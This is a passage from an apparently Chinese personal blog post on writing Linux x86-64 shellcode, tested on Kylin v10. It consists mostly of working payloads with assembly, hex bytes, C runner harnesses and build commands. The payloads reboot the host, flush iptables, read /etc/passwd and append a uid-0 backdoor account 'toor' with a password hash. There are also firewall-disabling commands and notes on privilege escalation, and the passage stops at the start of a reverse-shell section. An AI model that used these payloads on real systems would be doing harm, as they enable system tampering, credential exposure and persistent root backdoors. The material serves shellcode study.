class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d execve_reboot</span> </span><br><span class="line"></span><br><span class="line">execve_reboot：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:48 31 d2             xor    %rdx,%rdx</span><br><span class="line">  401003:52                   push   %rdx</span><br><span class="line">  401004:48 bb 6e 2f 72 65 62 movabs $0x746f6f6265722f6e,%rbx</span><br><span class="line">  40100b:6f 6f 74 </span><br><span class="line">  40100e:53                   push   %rbx</span><br><span class="line">  40100f:48 bb 2f 75 73 72 2f movabs $0x6962732f7273752f,%rbx</span><br><span class="line">  401016:73 62 69 </span><br><span class="line">  401019:53                   push   %rbx</span><br><span class="line">  40101a:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  40101d:50                   push   %rax</span><br><span class="line">  40101e:57                   push   %rdi</span><br><span class="line">  40101f:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">  401022:b0 3b                mov    $0x3b,%al</span><br><span class="line">  401024:0f 05                syscall </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x48\x31\xd2\x52\x48\xbb\x6e\x2f\x72\x65\x62\x6f\x6f\x74\x53\x48\xbb\x2f\x75\x73\x72\x2f\x73\x62\x69\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br></pre></td></tr></table></figure><h3 id="24-测试"><a class="markdownIt-Anchor" href="#24-测试"></a> 2.4 测试</h3><p>将机器码嵌入c语言运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> shellcode[] =  <span class="string">&quot;\x48\x31\xd2\x52\x48\xbb\x6e\x2f\x72\x65\x62\x6f\x6f\x74\x53\x48\xbb\x2f\x75\x73\x72\x2f\x73\x62\x69\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span>;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc execve_reboot.c -o execve_reboot -z execstack -z norelro -no-pie -g</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_reboot</span></span><br></pre></td></tr></table></figure><p>成功重启。</p><h2 id="3-关闭防火墙"><a class="markdownIt-Anchor" href="#3-关闭防火墙"></a> 3 关闭防火墙</h2><p>与防火墙相关的指令，转载于：<a href="https://www.cnblogs.com/jxldjsn/p/10794171.html">Linux关闭防火墙命令</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1:查看防火状态</span><br><span class="line">systemctl status firewalld</span><br><span class="line"></span><br><span class="line">2:暂时关闭防火墙</span><br><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">3:永久关闭防火墙</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">chkconfig iptables off</span><br><span class="line"></span><br><span class="line">4:重启防火墙</span><br><span class="line">systemctl enable firewalld</span><br><span class="line"></span><br><span class="line">5:永久关闭后重启</span><br><span class="line">//暂时还没有试过</span><br><span class="line">chkconfig iptables on</span><br></pre></td></tr></table></figure><p>我用systemctl 来查看防火墙，发现kylin v10似乎默认没有装防火墙的，那我们就自己装一下。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220808235702935.png" alt="image-20220808235702935"></p><p>查看防火墙状态：</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220808235838073.png" alt="image-20220808235838073"></p><p>我发现，不管是关闭防火墙，还是打开防火墙，都需要 root 权限。而且在<a href="http://www.shell-storm.org/shellcode/">Shellcodes database for study cases</a><a href="https://www.exploit-db.com/shellcodes">Exploit Database Shellcodes</a> 这两个网站上，均没有关于防火墙的 shellcode。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220816093541072.png" alt="image-20220816093541072"></p><p>不过没有发现这个防火墙的shellcode，但是我发现了 iptable 的shellcode。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220816094308437.png" alt="image-20220816094308437"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#Title: Linux/x86-64 - execve(&quot;/sbin/iptables&quot;, [&quot;/sbin/iptables&quot;, &quot;-F&quot;], NULL) - 49 bytes</span><br><span class="line">#    Author: 10n1z3d &lt;10n1z3d[at]w[dot]cn&gt;</span><br><span class="line">#    Date: Fri 09 Jul 2010 03:26:12 PM EEST</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">         </span><br><span class="line">_start:</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    push    rax</span><br><span class="line">    push    word 0x462d</span><br><span class="line">    mov     rcx, rsp</span><br><span class="line">       </span><br><span class="line">    mov     rbx, 0x73656c626174ffff</span><br><span class="line">    shr     rbx, 0x10</span><br><span class="line">    push    rbx</span><br><span class="line">    mov     rbx, 0x70692f6e6962732f</span><br><span class="line">    push    rbx</span><br><span class="line">    mov     rdi, rsp</span><br><span class="line">         </span><br><span class="line">    push    rax</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rdi</span><br><span class="line">    mov     rsi, rsp</span><br><span class="line">        </span><br><span class="line">    ; execve(&quot;/sbin/iptables&quot;, [&quot;/sbin/iptables&quot;, &quot;-F&quot;], NULL);</span><br><span class="line">    mov     al, 0x3b</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ nasm -f elf64 iptable.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 iptable.o -o iptable</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ strace ./iptable </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d iptable.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x70\x61\x73\x73\x77\x64\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc iptable.c -o iptable -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ sudo ./iptable</span><br><span class="line">*/</span><br><span class="line">#需要root权限执行，否者缺少权限无法执行。</span><br></pre></td></tr></table></figure><h2 id="4-passwd"><a class="markdownIt-Anchor" href="#4-passwd"></a> 4. passwd</h2><h3 id="41-读取-passwd"><a class="markdownIt-Anchor" href="#41-读取-passwd"></a> 4.1 读取 passwd</h3><p>通过系统调用 <code>命令cat</code> 读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Linux/x64 - execve &quot;cat /etc/passwd&quot; Shellcode (66 bytes)</span><br><span class="line"># Date: 2022-08-14</span><br><span class="line"># Author: rgzz</span><br><span class="line"># Tested on: Kylin v10</span><br><span class="line"># Shellcode Length: 66</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">;execve(&quot;/bin/cat&quot;, [&quot;/bin/cat&quot;, &quot;/etc/passwd&quot;], NULL)</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">       xor rax, rax                   ; Zeroes out RAX.</span><br><span class="line">       xor rbp, rbp                   ; Zeroes out RBP.</span><br><span class="line"></span><br><span class="line">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="line"></span><br><span class="line">       mov rbp, 0x6477737361702f63    ; Moves value &quot;dwsspa/c&quot; into RBP.</span><br><span class="line">       push rbp                       ; Pushes the vaueof RBP into the Stack.</span><br><span class="line"></span><br><span class="line">       mov rbp, 0x74652f2f2f2f2f2f    ; Moves value &quot;te//////&quot; into RBP.</span><br><span class="line">       push rbp                       ; Pushes the vaue of RBP into the Stack.</span><br><span class="line"></span><br><span class="line">       mov rbp, rsp                   ; Copies the value of the Stack into RBP.</span><br><span class="line">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="line"></span><br><span class="line">       mov rbx, 0x7461632f6e69622f    ; Moves value &quot;tac/nib/&quot; into RBX.</span><br><span class="line">       push rbx                       ; Pushes the vaue of RBX into the Stack.</span><br><span class="line"></span><br><span class="line">       mov rbx, rsp                   ; Copies the value of the Stack into RBX.</span><br><span class="line"></span><br><span class="line">       mov rdi, rsp                   ; Copies the value of the Stack into RDI.</span><br><span class="line">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="line"></span><br><span class="line">       mov rdx, rsp                   ; Copies the value of the Stack into RDX. As the previous DWORD was completely NULL, RDX is set to 0.</span><br><span class="line"></span><br><span class="line">       push rbp                       ; Pushes the vaue of RBP into the Stack.</span><br><span class="line">       push rbx                       ; Pushes the vaue of RBX into the Stack. The full string should be &quot;cat /etc/passwd&quot;.</span><br><span class="line"></span><br><span class="line">       mov rsi, rsp                   ; Copies this entire string from the Stack into RSI.</span><br><span class="line"></span><br><span class="line">       push word 59                   ; Pushes the value 59 (syscall value for execve in the x64 format).</span><br><span class="line">       pop ax                         ; Pops this value into AX so there are no NULLs.</span><br><span class="line">       syscall                        ; The syscall is executed.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ nasm -f elf64 cat_passwd.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 cat_passwd.o -o cat_passwd</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ strace ./cat_passwd </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d cat_passwd.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x70\x61\x73\x73\x77\x64\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc cat_passwd.c -o cat_passwd -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./cat_passwd</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>通过系统调用 <code>read</code> 方式读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Linux/x64 - read passwd</span><br><span class="line"># Date: 2022-08-14</span><br><span class="line"># Author: rgzz</span><br><span class="line"># Tested on: Kylin v10</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">jmp _push_filename</span><br><span class="line">  </span><br><span class="line">_readfile:</span><br><span class="line">; syscall open file, 0x2</span><br><span class="line">; open(&#x27;/etc/passwd&#x27;, O_RDWR), O_RDWR=0x2</span><br><span class="line">pop rdi ; pop path value</span><br><span class="line">xor rax, rax</span><br><span class="line">add al, 2</span><br><span class="line">xor rsi, rsi ; set O_RDWR flag</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">; syscall read file, 0x0</span><br><span class="line">; read(fd, buf, 0xfff), rdi=rax=fd(fd is open&#x27;s return number)</span><br><span class="line">sub sp, 0xfff</span><br><span class="line">lea rsi, [rsp]</span><br><span class="line">mov rdi, rax</span><br><span class="line">xor rdx, rdx</span><br><span class="line">mov dx, 0xfff; size to read</span><br><span class="line">xor rax, rax</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">; syscall write to stdout, 0x1</span><br><span class="line">; write(fd, buf, 0xfff)</span><br><span class="line">xor rdi, rdi</span><br><span class="line">inc rdi ; set stdout fd = 1</span><br><span class="line">mov rdx, rax</span><br><span class="line">xor rax, rax</span><br><span class="line">inc rax</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">; syscall exit</span><br><span class="line">xor rax, rax</span><br><span class="line">add al, 60</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">_push_filename:</span><br><span class="line">call _readfile</span><br><span class="line">path: db &quot;/etc/passwd&quot;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">akura@Kylin:~/文档/execveDir$ nasm -f elf64 rw_passwd.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 rw_passwd.o -o rw_passwd</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./rw_passwd</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d rw_passwd.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\xeb\x3b\x5f\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xc0\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc rw_passwd.c -o rw_passwd -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./rw_passwd</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h3 id="42-写入-passwd"><a class="markdownIt-Anchor" href="#42-写入-passwd"></a> 4.2 写入 passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">; Title: add root user (toor:toor)</span><br><span class="line">; Date: 2022-08-14</span><br><span class="line">; Author: rgzz</span><br><span class="line">; Tested on: kylin v10</span><br><span class="line">;</span><br><span class="line">; Action: Adds a user into /etc/passwd with the following information</span><br><span class="line">; username: toor</span><br><span class="line">; password: toor</span><br><span class="line">; uid: 0</span><br><span class="line">; gid: 0</span><br><span class="line">; home: /root</span><br><span class="line">; shell: /bin/sh</span><br><span class="line">;</span><br><span class="line">; toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">jmp _push_filename</span><br><span class="line"></span><br><span class="line">; #define __NR_open 2</span><br><span class="line">; int open(const char *pathname, int flags);</span><br><span class="line">; rax -&gt; 2</span><br><span class="line">; rdi -&gt; /etc/passwd</span><br><span class="line">; rsi -&gt; 0x401</span><br><span class="line">;</span><br><span class="line">; &gt;&gt;&gt; hex(os.O_WRONLY ^ os.O_APPEND)</span><br><span class="line">; 0x401</span><br><span class="line">_openfile:</span><br><span class="line">pop rdi   ; rdi -&gt; /etc/passwd</span><br><span class="line">xor rax, rax</span><br><span class="line">xor rsi, rsi  ; rsi to zero</span><br><span class="line">mov si, 0x401 ; rsi -&gt; O_WRONLY|O_APPEND</span><br><span class="line">add al, 0x2 ; rax -&gt; 2 (open)</span><br><span class="line">syscall ; open</span><br><span class="line"></span><br><span class="line">xchg rdi, rax ; save returned fd</span><br><span class="line">jmp short get_entry_address ; start jmp-call-pop</span><br><span class="line"></span><br><span class="line">write_entry:</span><br><span class="line">; #define __NR_write 1</span><br><span class="line">; ssize_t write(int fd, const void *buf, size_t count);</span><br><span class="line">; rax -&gt; 1</span><br><span class="line">; rdi -&gt; results of open syscall</span><br><span class="line">; rsi -&gt; user&#x27;s entry</span><br><span class="line">; rdx -&gt; len of user&#x27;s entry</span><br><span class="line">pop rsi ; end jmp-call-pop, rsi -&gt; user&#x27;s entry</span><br><span class="line">push 0x1</span><br><span class="line">pop rax ; rax -&gt; 1</span><br><span class="line">push 38 ; length + 1 for newline</span><br><span class="line">pop rdx ; rdx -&gt; length of user&#x27;s entry</span><br><span class="line">syscall ; write</span><br><span class="line"></span><br><span class="line">; #define __NR_exit 60</span><br><span class="line">; void _exit(int status);</span><br><span class="line">; rax -&gt; 60</span><br><span class="line">; rdi -&gt; don&#x27;t care</span><br><span class="line">push 60</span><br><span class="line">pop rax</span><br><span class="line">syscall ; OS will handle closing fd at exit</span><br><span class="line"></span><br><span class="line">get_entry_address:</span><br><span class="line">call write_entry</span><br><span class="line">user_entry: db &quot;toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh&quot;,0xa</span><br><span class="line"></span><br><span class="line">_push_filename:</span><br><span class="line">call _openfile</span><br><span class="line">path: db &quot;/etc/passwd&quot;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc -c addRootUser.c -o addRootUser.o</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc addRootUser.o -o addRootUser -static</span><br><span class="line">Usage:</span><br><span class="line">akura@Kylin:~/文档/execveDir$ nasm -f elf64 addRootUser.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 addRootUser.o -o addRootUser</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./addRootUser</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d addRootUser.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line">//注意：上面这个程序，编译后需要以root权限来执行，否则没有效果。至于提权，，目前还没有思路。。</span><br><span class="line">//提权思路：在系统文件中找到一个具有777权限的文件，在里面写入我们的提权代码执行，或者是把我们的可执行文件，提升权限执行。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\xeb\x4c\x5f\x48\x31\xc0\x48\x31\xf6\x66\xbe\x01\x04\x04\x02\x0f\x05\x48\x97\xeb\x0e\x5e\x6a\x01\x58\x6a\x26\x5a\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xed\xff\xff\xff\x74\x6f\x6f\x72\x3a\x73\x58\x75\x43\x4b\x69\x37\x6b\x33\x58\x68\x2f\x73\x3a\x30\x3a\x30\x3a\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\xe8\xaf\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc addRootUser.c -o addRootUser -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ sudo ./addRootUser</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220814135049772.png" alt="image-20220814135049772"></p><h2 id="5-反向shell"><a class="markdownIt-Anchor" href="#5-反向shell"></a> 5 反向shell</h2><blockquote><p>参考：</p><p>​<a href="https://zhuanlan.zhihu.com/p/138393396">反弹shell原理与实现</a></p><p>​<a href="https://blog.csdn.net/qinjinghua2012/article/details/42622431">IP地址如何用十六进制表示</a></p><p>​<a href="http://www.shell-storm.org/shellcode/files/shellcode-907.php">Linux/x86-64 